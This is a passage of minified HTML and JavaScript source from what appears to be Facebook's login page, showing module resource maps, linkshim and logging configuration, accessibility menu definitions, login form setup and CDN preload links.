                        "FOwDJ9I", "rq2J+HZ", "QOEqao5", "k2hUbUf", "To8CHca"
                    ],
                    "be": 1
                },
                "XUIDialogTitle.react": {
                    "r": ["WjFF9uN", "XnzIB9c", "kP1XEF1", "OeK4roN", "4l\/JzXY", "00Aws6K", "5sQ5HiS",
                        "B\/jQVDI", "xfkMCpl", "F2NLRsG", "2hq4l+6", "To8CHca", "rq2J+HZ",
                        "QOEqao5", "B9uu9Uu", "k2hUbUf"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                        "r": ["VzF4auJ"]
                    },
                    "be": 1
                },
                "XUIGrayText.react": {
                    "r": ["WjFF9uN", "kP1XEF1", "OeK4roN", "9zxHPvx", "FOwDJ9I", "rq2J+HZ", "QOEqao5",
                        "k2hUbUf", "To8CHca"
                    ],
                    "be": 1
                },
                "DialogX": {
                    "r": ["WjFF9uN", "kP1XEF1", "OeK4roN", "B9uu9Uu", "5sQ5HiS", "xfkMCpl", "F2NLRsG",
                        "2hq4l+6", "To8CHca", "ON0J\/ya", "rq2J+HZ"
                    ],
                    "rds": {
                        "m": ["FbtLogging", "IntlQtEventFalcoEvent"],
                        "r": ["VzF4auJ"]
                    },
                    "be": 1
                },
                "React": {
                    "r": ["rq2J+HZ", "k2hUbUf"],
                    "be": 1
                }
            }
        })
    });
    </script>
    <script>
    requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
        InitialJSLoader.loadOnDOMContentReady(["lVPXXTz", "xfkMCpl", "5sQ5HiS", "VzF4auJ", "6l7POEm", "WjFF9uN",
            "To8CHca", "sCh2YZt", "\/AN8Bt5", "rq2J+HZ", "OeK4roN", "kP1XEF1", "00Aws6K", "sWwYI0R",
            "ON0J\/ya", "CGkH4FY", "k2hUbUf", "QOEqao5", "P\/mr5VE"
        ]);
    });
    </script>
    <script>
    requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        var s = (new ServerJS());
        s.handle({
            "define": [
                ["LinkshimHandlerConfig", [], {
                    "supports_meta_referrer": true,
                    "default_meta_referrer_policy": "origin-when-crossorigin",
                    "switched_meta_referrer_policy": "origin",
                    "non_linkshim_lnfb_mode": null,
                    "link_react_default_hash": "AT0AuPuPPj2jhbja4sd1SpPxV15-qVy7on_lFFMGI6SytQHBTIaKBDFQfcHCuDeLIDWviQalvBwGYzMhSBsxy8Erywe-h9FAige6lad0r0gGDiE7TDApLQncWnsinA0gxO89-JVTA0EM4RPj4SveKg",
                    "untrusted_link_default_hash": "AT09KBYBgdPasw8oVXRruoIIXkWTyw3meO8NRARi0pg93IdoWRJIvLZ0JJNH5ywyMexqOMIm0jwl2DOvwgVLHTGigP2UR2yraCZ3eQDUW7xUc3PA_XIZL08cRcTq0AZn4u4_uBj8KVPgDO4gmZIPLA",
                    "linkshim_host": "l.facebook.com",
                    "linkshim_path": "\/l.php",
                    "linkshim_enc_param": "h",
                    "linkshim_url_param": "u",
                    "use_rel_no_opener": true,
                    "always_use_https": true,
                    "onion_always_shim": true,
                    "middle_click_requires_event": true,
                    "www_safe_js_mode": "asynclazy",
                    "m_safe_js_mode": "MLynx_asynclazy",
                    "ghl_param_link_shim": false,
                    "click_ids": [],
                    "is_linkshim_supported": true,
                    "current_domain": "facebook.com",
                    "blocklisted_domains": ["ad.doubleclick.net",
                        "ads-encryption-url-example.com", "bs.serving-sys.com",
                        "ad.atdmt.com", "adform.net", "ad13.adfarm1.adition.com",
                        "ilovemyfreedoms.com", "secure.adnxs.com"
                    ],
                    "is_mobile_device": false
                }, 27]
            ],
            "instances": [
                ["__inst_5b4d0c00_0_0_Co", ["Menu", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
                    [
                        [], {
                            "id": "u_0_0_\/c",
                            "behaviors": [{
                                "__m": "XUIMenuWithSquareCorner"
                            }],
                            "theme": {
                                "__m": "XUIMenuTheme"
                            }
                        }
                    ], 2
                ],
                ["__inst_5b4d0c00_0_1_7Q", ["Menu", "MenuItem", "__markup_3310c079_0_0_hU", "HTML",
                        "__markup_3310c079_0_1_M4", "__markup_3310c079_0_2_kg",
                        "__markup_3310c079_0_3_k+", "XUIMenuWithSquareCorner", "XUIMenuTheme"
                    ],
                    [
                        [{
                            "value": "key_shortcuts",
                            "ctor": {
                                "__m": "MenuItem"
                            },
                            "markup": {
                                "__m": "__markup_3310c079_0_0_hU"
                            },
                            "label": "Keyboard shortcut help...",
                            "title": "",
                            "className": null
                        }, {
                            "href": "\/help\/accessibility",
                            "target": "_blank",
                            "value": "help_center",
                            "ctor": {
                                "__m": "MenuItem"
                            },
                            "markup": {
                                "__m": "__markup_3310c079_0_1_M4"
                            },
                            "label": "Accessibility Help Centre",
                            "title": "",
                            "className": null
                        }, {
                            "href": "\/help\/contact\/accessibility",
                            "target": "_blank",
                            "value": "submit_feedback",
                            "ctor": {
                                "__m": "MenuItem"
                            },
                            "markup": {
                                "__m": "__markup_3310c079_0_2_kg"
                            },
                            "label": "Submit feedback",
                            "title": "",
                            "className": null
                        }, {
                            "href": "\/accessibility",
                            "target": "_blank",
                            "value": "facebook_page",
                            "ctor": {
                                "__m": "MenuItem"
                            },
                            "markup": {
                                "__m": "__markup_3310c079_0_3_k+"
                            },
                            "label": "Updates from Facebook Accessibility",
                            "title": "",
                            "className": null
                        }], {
                            "id": "u_0_1_jo",
                            "behaviors": [{
                                "__m": "XUIMenuWithSquareCorner"
                            }],
                            "theme": {
                                "__m": "XUIMenuTheme"
                            }
                        }
                    ], 2
                ],
                ["__inst_e5ad243d_0_0_uW", ["PopoverMenu", "__inst_1de146dc_0_1_IF",
                        "__elem_ec77afbd_0_1_qL", "__inst_5b4d0c00_0_1_7Q"
                    ],
                    [{
                            "__m": "__inst_1de146dc_0_1_IF"
                        }, {
                            "__m": "__elem_ec77afbd_0_1_qL"
                        }, {
                            "__m": "__inst_5b4d0c00_0_1_7Q"
                        },
                        []
                    ], 2
                ],
                ["__inst_e5ad243d_0_1_Se", ["PopoverMenu", "__inst_1de146dc_0_0_ZQ",
                        "__elem_ec77afbd_0_0_m0", "__inst_5b4d0c00_0_0_Co"
                    ],
                    [{
                            "__m": "__inst_1de146dc_0_0_ZQ"
                        }, {
                            "__m": "__elem_ec77afbd_0_0_m0"
                        }, {
                            "__m": "__inst_5b4d0c00_0_0_Co"
                        },
                        []
                    ], 2
                ],
                ["__inst_1de146dc_0_0_ZQ", ["Popover", "__elem_1de146dc_0_0_pa",
                        "__elem_ec77afbd_0_0_m0", "ContextualLayerAutoFlip", "ContextualDialogArrow"
                    ],
                    [{
                            "__m": "__elem_1de146dc_0_0_pa"
                        }, {
                            "__m": "__elem_ec77afbd_0_0_m0"
                        },
                        [{
                            "__m": "ContextualLayerAutoFlip"
                        }, {
                            "__m": "ContextualDialogArrow"
                        }], {
                            "alignh": "left",
                            "position": "below"
                        }
                    ], 2
                ],
                ["__inst_1de146dc_0_1_IF", ["Popover", "__elem_1de146dc_0_1_oT",
                        "__elem_ec77afbd_0_1_qL", "ContextualLayerAutoFlip", "ContextualDialogArrow"
                    ],
                    [{
                            "__m": "__elem_1de146dc_0_1_oT"
                        }, {
                            "__m": "__elem_ec77afbd_0_1_qL"
                        },
                        [{
                            "__m": "ContextualLayerAutoFlip"
                        }, {
                            "__m": "ContextualDialogArrow"
                        }], {
                            "alignh": "right",
                            "position": "below"
                        }
                    ], 2
                ]
            ],
            "markup": [
                ["__markup_3310c079_0_0_hU", {
                    "__html": "Keyboard shortcut help..."
                }, 1],
                ["__markup_3310c079_0_1_M4", {
                    "__html": "Accessibility Help Centre"
                }, 1],
                ["__markup_3310c079_0_2_kg", {
                    "__html": "Submit feedback"
                }, 1],
                ["__markup_3310c079_0_3_k+", {
                    "__html": "Updates from Facebook Accessibility"
                }, 1]
            ],
            "elements": [
                ["__elem_a588f507_0_1_ks", "u_0_3_u6", 1],
                ["__elem_3fc3da18_0_0_e8", "u_0_4_\/v", 1],
                ["__elem_51be6cb7_0_0_ki", "u_0_5_Nc", 1],
                ["__elem_1de146dc_0_0_pa", "u_0_6_ji", 1],
                ["__elem_ec77afbd_0_0_m0", "u_0_7_NZ", 2],
                ["__elem_1de146dc_0_1_oT", "u_0_8_3C", 1],
                ["__elem_ec77afbd_0_1_qL", "u_0_9_LZ", 2],
                ["__elem_a588f507_0_0_oJ", "globalContainer", 2],
                ["__elem_a588f507_0_2_Bb", "content", 1],
                ["__elem_835c633a_0_0_Sz", "u_0_a_4F", 1],
                ["__elem_9f5fac15_0_0_H\/", "passContainer", 1],
                ["__elem_558608f3_0_0_yG", "pass", 1],
                ["__elem_a588f507_0_3_8b", "u_0_b_iy", 1],
                ["__elem_a588f507_0_4_yb", "u_0_c_pS", 1],
                ["__elem_45d73b5d_0_0_K7", "u_0_d_Uy", 1]
            ],
            "require": [
                ["ServiceWorkerLoginAndLogout", "login", [],
                    []
                ],
                ["WebPixelRatioDetector", "startDetecting", [],
                    [false]
                ],
                ["ScriptPath", "set", [],
                    ["XIndexReduxController", "a1f3c513", {
                        "imp_id": "05y5fYwVcmZLRrhdx",
                        "ef_page": null,
                        "uri": "https:\/\/www.facebook.com\/"
                    }]
                ],
                ["UITinyViewportAction", "init", [],
                    []
                ],
                ["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0_oJ"],
                    [{
                        "__m": "__elem_a588f507_0_0_oJ"
                    }]
                ],
                ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_a588f507_0_0_oJ"],
                    [
                        [{
                            "__m": "__elem_a588f507_0_0_oJ"
                        }]
                    ]
                ],
                ["KeyboardActivityLogger", "init", [],
                    []
                ],
                ["FocusRing", "init", [],
                    []
                ],
                ["ErrorMessageConsole", "listenForUncaughtErrors", [],
                    []
                ],
                ["HardwareCSS", "init", [],
                    []
                ],
                ["NavigationAssistantController", "init", ["__elem_3fc3da18_0_0_e8",
                        "__elem_51be6cb7_0_0_ki", "__inst_5b4d0c00_0_0_Co",
                        "__inst_5b4d0c00_0_1_7Q", "__inst_e5ad243d_0_0_uW", "__inst_e5ad243d_0_1_Se"
                    ],
                    [{
                        "__m": "__elem_3fc3da18_0_0_e8"
                    }, {
                        "__m": "__elem_51be6cb7_0_0_ki"
                    }, {
                        "__m": "__inst_5b4d0c00_0_0_Co"
                    }, {
                        "__m": "__inst_5b4d0c00_0_1_7Q"
                    }, null, {
                        "accessibilityPopoverMenu": {
                            "__m": "__inst_e5ad243d_0_0_uW"
                        },
                        "globalPopoverMenu": null,
                        "sectionsPopoverMenu": {
                            "__m": "__inst_e5ad243d_0_1_Se"
                        }
                    }, true]
                ],
                ["__inst_e5ad243d_0_1_Se"],
                ["__inst_1de146dc_0_0_ZQ"],
                ["__inst_e5ad243d_0_0_uW"],
                ["__inst_1de146dc_0_1_IF"],
                ["IntlUtils"],
                ["FBLynx", "setupDelegation", [],
                    []
                ],
                ["LoginFormController", "init", ["__elem_835c633a_0_0_Sz",
                    "__elem_45d73b5d_0_0_K7"],
                    [{
                        "__m": "__elem_835c633a_0_0_Sz"
                    }, {
                        "__m": "__elem_45d73b5d_0_0_K7"
                    }, null, true, {
                        "pubKey": {
                            "publicKey": "7e34f49c70d6755fcb86ede8c18a2b310ce1dec6f6da228d295d3b4cc270af57",
                            "keyId": 208
                        }
                    }]
                ],
                ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
                    [{
                        "contactpointFieldID": "email",
                        "serverPrefill": ""
                    }]
                ],
                ["BrowserPrefillLogging", "initPasswordFieldLogging", [],
                    [{
                        "passwordFieldID": "pass"
                    }]
                ],
                ["FocusListener"],
                ["FlipDirectionOnKeypress"],
                ["LoginFormToggle", "initToggle", ["__elem_a588f507_0_3_8b",
                        "__elem_a588f507_0_4_yb", "__elem_558608f3_0_0_yG",
                        "__elem_9f5fac15_0_0_H\/"
                    ],
                    [{
                        "__m": "__elem_a588f507_0_3_8b"
                    }, {
                        "__m": "__elem_a588f507_0_4_yb"
                    }, {
                        "__m": "__elem_558608f3_0_0_yG"
                    }, {
                        "__m": "__elem_9f5fac15_0_0_H\/"
                    }]
                ],
                ["Animation"],
                ["PageTransitions"],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["BanzaiScuba_DEPRECATED", "Animation", "FbtLogging",
                            "IntlQtEventFalcoEvent", "PageTransitions"
                        ], "sd"
                    ]
                ],
                ["RequireDeferredReference", "unblock", [],
                    [
                        ["BanzaiScuba_DEPRECATED", "Animation", "FbtLogging",
                            "IntlQtEventFalcoEvent", "PageTransitions"
                        ], "css"
                    ]
                ],
                ["TimeSliceImpl"],
                ["HasteSupportData"],
                ["ServerJS"],
                ["Run"],
                ["InitialJSLoader"]
            ],
            "contexts": [
                [{
                    "__m": "__elem_a588f507_0_1_ks"
                }, true],
                [{
                    "__m": "__elem_a588f507_0_2_Bb"
                }, true]
            ]
        });
        requireLazy(["Run"], function(Run) {
            Run.onAfterLoad(function() {
                s.cleanup(TimeSlice)
            })
        });
    });
    </script>
    <script>
    now_inl = (function() {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart ? function() {
            return p.now() + p.timing.navigationStart
        } : function() {
            return new Date().getTime()
        };
    })();
    window.__bigPipeFR = now_inl();
    </script>
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/L0VTH1UsUXD.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/l/0,cross/fFUVjyV8dGQ.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/l/0,cross/bAlWYVax4ow.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/KG1ugOqQXfY.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/dcPAKjn6Jh_.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="xTDjvcQX" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/BwlkRv7B4IH.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="xTDjvcQX" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/q8NTDF-khd8.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="xTDjvcQX" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yO/l/en_GB/YVPMKVKdbNX.js?_nc_x=Ij3Wp8lg5Kz"
        as="script" crossorigin="anonymous" nonce="xTDjvcQX" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/e6yHHXG-vON.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/N9PepC8gN1h.js?_nc_x=Ij3Wp8lg5Kz" as="script"
        crossorigin="anonymous" nonce="xTDjvcQX" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/Gt_Hdc3lf8P.css?_nc_x=Ij3Wp8lg5Kz"
        as="style" crossorigin="anonymous" />
    <script>
    window.__bigPipeCtor = now_inl();
    requireLazy(["BigPipe"], function(BigPipe) {
        define("__bigPipe", [], window.bigPipe = new BigPipe({
            "forceFinish": true,
            "config": {
                "flush_pagelets_asap": true,
                "dispatch_pagelet_replayable_actions": false
            }
        }));
    });
    </script>
    <script nonce="xTDjvcQX">
    (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.beforePageletArrive("first_response", n);
        })
    })();
    </script>
    <script nonce="xTDjvcQX">
    requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
            displayResources: ["0QQt+vI", "9zxHPvx", "B9uu9Uu", "epDBIN3", "kP1XEF1", "00Aws6K",
                "5sQ5HiS", "xfkMCpl", "F2NLRsG", "To8CHca", "4l/JzXY", "P/mr5VE"
            ],
            id: "first_response",
            phase: 0,
            last_in_phase: true,
            tti_phase: 0,
            all_phases: [63],
            hsrp: {
                hblp: {
                    consistency: {
                        rev: 1005560434
                    }
                }
            },
            allResources: ["lVPXXTz", "xfkMCpl", "5sQ5HiS", "VzF4auJ", "6l7POEm", "WjFF9uN",
                "To8CHca", "sCh2YZt", "/AN8Bt5", "rq2J+HZ", "OeK4roN", "kP1XEF1", "00Aws6K",
                "0QQt+vI", "9zxHPvx", "B9uu9Uu", "epDBIN3", "F2NLRsG", "4l/JzXY", "sWwYI0R",
                "ON0J/ya", "P/mr5VE", "CGkH4FY", "k2hUbUf", "QOEqao5"
            ]
        });
    }));
    </script>
    <script>
    requireLazy(["__bigPipe"], function(bigPipe) {
        bigPipe.setPageID("7100008947758635071-0")
    });
    CavalryLogger.setPageID("7100008947758635071-0");
    </script>
    <script nonce="xTDjvcQX">
    (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.beforePageletArrive("last_response", n);
        })
    })();
    </script>
    <script nonce="xTDjvcQX">
    requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
            displayResources: ["To8CHca"],
            id: "last_response",
            phase: 63,
            last_in_phase: true,
            the_end: true,
            jsmods: {
                define: [
                    ["TimeSliceInteractionSV", [], {
                        on_demand_reference_counting: true,
                        on_demand_profiling_counters: true,
                        default_rate: 1000,
                        lite_default_rate: 100,
                        interaction_to_lite_coinflip: {
                            ADS_INTERFACES_INTERACTION: 0,
                            ads_perf_scenario: 0,
                            ads_wait_time: 0,
                            Event: 1
                        },
                        interaction_to_coinflip: {
                            ADS_INTERFACES_INTERACTION: 1,
                            ads_perf_scenario: 1,
                            ads_wait_time: 1,
                            Event: 100
                        },
                        enable_heartbeat: true,
                        maxBlockMergeDuration: 0,
                        maxBlockMergeDistance: 0,
                        enable_banzai_stream: true,
                        user_timing_coinflip: 50,
                        banzai_stream_coinflip: 0,
                        compression_enabled: true,
                        ref_counting_fix: false,
                        ref_counting_cont_fix: false,
                        also_record_new_timeslice_format: false,
                        force_async_request_tracing_on: false
                    }, 2609],
                    ["WebDriverConfig", [], {
                        isTestRunning: false,
                        isJestE2ETestRun: false,
                        isXRequestConfigEnabled: false,
                        auxiliaryServiceInfo: {},
                        testPath: null,
                        originHost: null
                    }, 5332],
                    ["cr:1642797", ["BanzaiBase"], {
                        __rc: ["BanzaiBase",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1458113", [], {
                        __rc: [null,
                            "Aa3BDZriNP5PMSET7LXfouxnoYcUMMNURWFytb4fr963EOjuDOUePdmYDLDbLukxShUvx0RMoGfW_OVxyR7cc492vF6MK2M"
                        ]
                    }, -1],
                    ["cr:1039", [], {
                        __rc: [null,
                            "Aa3sTABgFe2Xb68dAx3sxsXJnDrGD6rlufrBvWFbKSB219tu6tyLRKVLtPQ8mu7glOAHHXhFIn8"
                        ]
                    }, -1],
                    ["cr:1041", [], {
                        __rc: [null,
                            "Aa3sTABgFe2Xb68dAx3sxsXJnDrGD6rlufrBvWFbKSB219tu6tyLRKVLtPQ8mu7glOAHHXhFIn8"
                        ]
                    }, -1],
                    ["cr:1048", [], {
                        __rc: [null,
                            "Aa3sTABgFe2Xb68dAx3sxsXJnDrGD6rlufrBvWFbKSB219tu6tyLRKVLtPQ8mu7glOAHHXhFIn8"
                        ]
                    }, -1],
                    ["cr:917439", ["PageTransitionsBlue"], {
                        __rc: ["PageTransitionsBlue",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1108857", [], {
                        __rc: [null,
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["cr:1294158", ["React.classic"], {
                        __rc: ["React.classic",
                            "Aa0vCYUEh3kbNBmEM6y4Dwc5kz_KKa3w-P3wNYh4qCzRfgD9ngJGpmSSe61VrJjlM8WpZytPNMDfXuHqh13dKdCSQxVt"
                        ]
                    }, -1],
                    ["cr:1294246", ["ReactDOM.classic"], {
                        __rc: ["ReactDOM.classic",
                            "Aa0vCYUEh3kbNBmEM6y4Dwc5kz_KKa3w-P3wNYh4qCzRfgD9ngJGpmSSe61VrJjlM8WpZytPNMDfXuHqh13dKdCSQxVt"
                        ]
                    }, -1],
                    ["cr:1069930", [], {
                        __rc: [null,
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1083116", ["XAsyncRequest"], {
                        __rc: ["XAsyncRequest",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1083117", [], {
                        __rc: [null,
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:2682", ["warningBlueish"], {
                        __rc: ["warningBlueish",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:11202", [], {
                        __rc: [null,
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["cr:971473", ["LayerHideOnTransition"], {
                        __rc: ["LayerHideOnTransition",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1105154", [], {
                        __rc: [null,
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["BanzaiConfig", [], {
                        MAX_SIZE: 10000,
                        MAX_WAIT: 150000,
                        MIN_WAIT: null,
                        RESTORE_WAIT: 150000,
                        blacklist: ["time_spent"],
                        disabled: false,
                        gks: {
                            boosted_pagelikes: true,
                            mercury_send_error_logging: true,
                            platform_oauth_client_events: true,
                            graphexplorer: true,
                            sticker_search_ranking: true
                        },
                        known_routes: ["artillery_javascript_actions",
                            "artillery_javascript_trace", "artillery_logger_data",
                            "logger", "falco", "gk2_exposure", "js_error_logging",
                            "loom_trace", "marauder", "perfx_custom_logger_endpoint",
                            "qex", "require_cond_exposure_logging", "sri_logger_data"
                        ],
                        should_drop_unknown_routes: true,
                        should_log_unknown_routes: false
                    }, 7],
                    ["PageTransitionsConfig", [], {
                        reloadOnBootloadError: true
                    }, 1067],
                    ["cr:692209", ["cancelIdleCallbackBlue"], {
                        __rc: ["cancelIdleCallbackBlue",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1292365", ["React-prod.classic"], {
                        __rc: ["React-prod.classic",
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["cr:1344485", ["ReactDOM.classic.prod-or-profiling"], {
                        __rc: ["ReactDOM.classic.prod-or-profiling",
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["cr:2683", ["warningBlue"], {
                        __rc: ["warningBlue",
                            "Aa1y1FXP5rX9Y1LoUfG50IwSM4sx65n0BKM_TCdNygylk4FriPryj9ei2Fy1pxhduooPs6PZrfVSEYKs4dfexyCTXIrm"
                        ]
                    }, -1],
                    ["CoreWarningGK", [], {
                        forceWarning: false
                    }, 725],
                    ["cr:1344486", ["ReactDOM.classic.prod"], {
                        __rc: ["ReactDOM.classic.prod",
                            "Aa1HqTKg5hOwrhIYaB-2NtnqurY1HHYWuYnnUWN63pupNXEegi_fVTkna-IeLoZxNaa-7q7Y0lMs3Nq9WlfuE9u5rssulypyWg"
                        ]
                    }, -1],
                    ["cr:983844", [], {
                        __rc: [null,
                            "Aa3rXNyyziC0SKmzIm1mz2VWVdXKNPGRv7KrUpNhEFpjPB0OwoOBIUp8SZN10CK5E6WSngRpl3p9D6zbJw"
                        ]
                    }, -1],
                    ["cr:1344487", ["ReactDOM-prod.classic"], {
                        __rc: ["ReactDOM-prod.classic",
                            "Aa33z6kEXL1I9rBxibOOfdPYAvkUPQpsMW6XPvF-gadITTqhnfZ7Yc8C-Q-jshAwP7B_PAK1oddp5QqkqW5vrtK0oadfhPIQ6xQxORSL"
                        ]
                    }, -1],
                    ["cr:1353359", ["EventListenerImplForBlue"], {
                        __rc: ["EventListenerImplForBlue",
                            "Aa0hSy6Yk6cg0OONIeFXyncAY-4sA6xudmsDovTsCyEwm0C9jv5KNGKXzstMm3j2VJUR7Q3EbaIKYN6Go7swzUBOozWiUmB53w"
                        ]
                    }, -1],
                    ["KillabyteProfilerConfig", [], {
                        htmlProfilerModule: null,
                        profilerModule: null,
                        depTypes: {
                            BL: "bl",
                            NON_BL: "non-bl"
                        }
                    }, 1145],
                    ["QuicklingConfig", [], {
                        version: "1005560434;0;",
                        sessionLength: 30,
                        inactivePageRegex: "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                        badRequestKeys: ["nonce", "access_token", "oauth_token", "xs",
                            "checkpoint_data", "code"
                        ],
                        logRefreshOverhead: false
                    }, 60],
                    ["TrackingConfig", [], {
                        domain: "https://pixel.facebook.com"
                    }, 325],
                    ["WebDevicePerfInfoData", [], {
                        needsFullUpdate: true,
                        needsPartialUpdate: false,
                        shouldLogResourcePerf: false
                    }, 3977],
                    ["WebStorageMonsterLoggingURI", [], {
                        uri: "/ajax/webstorage/process_keys/?state=1"
                    }, 3032],
                    ["BrowserPaymentHandlerConfig", [], {
                        enabled: false
                    }, 3904],
                    ["TimeSpentConfig", [], {
                        "0_delay": 0,
                        "0_timeout": 8,
                        delay: 1000,
                        timeout: 64
                    }, 142],
                    ["cr:1351741", ["CometEventListener"], {
                        __rc: ["CometEventListener",
                            "Aa2JpMmY7tFnQJV_gXZDNt6XdUaRk7P-54Ub1MW6vILBHHl0dpdPqgxhXpE8UzcLhKd8au8XZ6mRGzhqq1ju7Xhjytg0Iuod_k2sTqxQUr1eSJTImC_w"
                        ]
                    }, -1],
                    ["cr:1634616", ["UserActivityBlue"], {
                        __rc: ["UserActivityBlue",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
                        __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["cr:1187159", ["BlueCompatBroker"], {
                        __rc: ["BlueCompatBroker",
                            "Aa3zvLllJMlcekGiLBLGtC4D1fEwaCSrB8laIpZME5gKfr4Ep2OiyoCe2dvILjlK7I-b0BlmmoviVT4djCrHN3bC_cI"
                        ]
                    }, -1],
                    ["ImmediateActiveSecondsConfig", [], {
                        sampling_rate: 0
                    }, 423]
                ],
                require: [
                    ["BDClientSignalCollectionTrigger", "startSignalCollection", [],
                        [{
                            sc: "{\"t\":1637128278,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
                            fds: 60,
                            fda: 60,
                            i: 60,
                            sbs: 1,
                            dbs: 100,
                            bbs: 100,
                            hbi: 60,
